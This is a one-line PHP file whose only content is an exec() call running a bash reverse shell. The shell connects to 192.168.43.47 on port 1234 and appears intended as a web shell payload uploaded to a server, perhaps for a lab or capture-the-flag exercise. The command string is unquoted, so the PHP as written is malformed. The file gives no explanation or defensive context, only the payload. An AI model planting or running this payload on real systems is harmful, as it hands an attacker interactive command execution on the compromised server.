<?php exec(/bin/bash -c bash -i >& /dev/tcp/192.168.43.47/1234 0>&1);
